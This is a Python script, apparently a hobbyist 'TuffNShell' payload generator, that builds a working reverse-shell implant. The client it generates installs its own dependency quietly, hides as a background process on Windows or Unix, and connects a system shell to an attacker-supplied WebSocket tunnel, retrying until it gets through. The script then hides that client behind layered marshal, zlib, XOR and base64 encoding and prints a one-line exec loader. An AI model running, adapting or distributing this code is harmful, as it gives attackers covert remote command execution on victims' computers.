import base64
import marshal
import zlib


#Mayonaise
print("///// TuffNShell payload generator /////\n")
input_link = input("Enter your WSS / Tunneling URL (wss://xxxx.trycloudflare.com): ").strip()
if not input_link:
    print("error")
    exit(1)

if input_link.startswith("https://"):
    cf_url = input_link.replace("https://", "wss://", 1)
elif input_link.startswith("http://"):
    cf_url = input_link.replace("http://", "ws://", 1)
else:
    cf_url = f"wss://{input_link}"
cf_url = cf_url.rstrip("/")

# KODE KLIEN UTAMA (Menggunakan mekanisme thread & async murni original yang terbukti paling stabil & gacor nyambung)
client_source = f"""import os, sys, subprocess, threading

def _install():
    try:
        import websockets
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "websockets", "--quiet", "--no-warn-script-location"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
_install()

import asyncio, websockets

CF_URL = "{cf_url}"

def _daemon():
    if os.name == 'nt':
        if not sys.executable.endswith("pythonw.exe"):
            pw = sys.executable.replace("python.exe", "pythonw.exe")
            if os.path.exists(pw):
                subprocess.Popen([pw] + sys.argv, creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
    else:
        try:
            if os.fork() > 0:
                sys.exit(0)
        except Exception:
            pass
        os.setsid()

async def _bridge():
    while True:
        try:
            async with websockets.connect(CF_URL) as ws:
                shell_cmd = "cmd.exe" if os.name == 'nt' else "/bin/sh"
                proc = await asyncio.create_subprocess_shell(
                    shell_cmd,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )

                async def wss_to_shell():
                    async for msg in ws:
                        if isinstance(msg, str):
                            proc.stdin.write(msg.encode('utf-8'))
                        else:
                            proc.stdin.write(msg)
                        await proc.stdin.drain()

                async def shell_to_wss():
                    while True:
                        data = await proc.stdout.read(1024)
                        if not data: break
                        await ws.send(data)

                async def shell_err_to_wss():
                    while True:
                        data = await proc.stderr.read(1024)
                        if not data: break
                        await ws.send(data)

                await asyncio.gather(wss_to_shell(), shell_to_wss(), shell_err_to_wss())
        except Exception:
            await asyncio.sleep(5)

def _start():
    _daemon()
    try:
        asyncio.run(_bridge())
    except Exception:
        pass

threading.Thread(target=_start, daemon=True).start()
"""
#Beef Fhichken
xor_key = 0x5A
byte_code = compile(client_source, "<string>", "exec")
layer1 = zlib.compress(marshal.dumps(byte_code))
layer2 = bytes([b ^ xor_key for b in layer1])
layer3 = base64.b64encode(layer2).decode("utf-8")

filename = "client.py"
loader_code = f"""import base64, marshal, zlib
_x = lambda d, k: bytes([b ^ k for b in d])
_enc = "{layer3}"
_key = {xor_key}

try:
    _l3 = base64.b64decode(_enc)
    _l2 = _x(_l3, _key)
    _l1 = zlib.decompress(_l2)
    _bc = marshal.loads(_l1)
    exec(_bc)
except Exception:
    pass
"""

with open(filename, "w", encoding="utf-8") as f:
    f.write(loader_code)

runner_template = f"""import base64, marshal, zlib
_x = lambda d, k: bytes([b ^ k for b in d])
_e = "{layer3}"
try:
    exec(marshal.loads(zlib.decompress(_x(base64.b64decode(_e), {xor_key}))))
except Exception: pass
"""
#Pizza Burger
r_bytes = zlib.compress(marshal.dumps(compile(runner_template, "<string>", "exec")))
r_xor = bytes([b ^ xor_key for b in r_bytes])
r_b64 = base64.b64encode(r_xor).decode("utf-8")

one_liner_payload = f"""import base64, marshal, zlib; exec(marshal.loads(zlib.decompress(bytes([b^{xor_key} for b in base64.b64decode("{r_b64}")] ))))"""

print("\n\nPayload generate :/\n\nAnd client.py generate :/\n\n")
print("-" * 70)
print(one_liner_payload)
print("-" * 70)
#Chips
#liila fors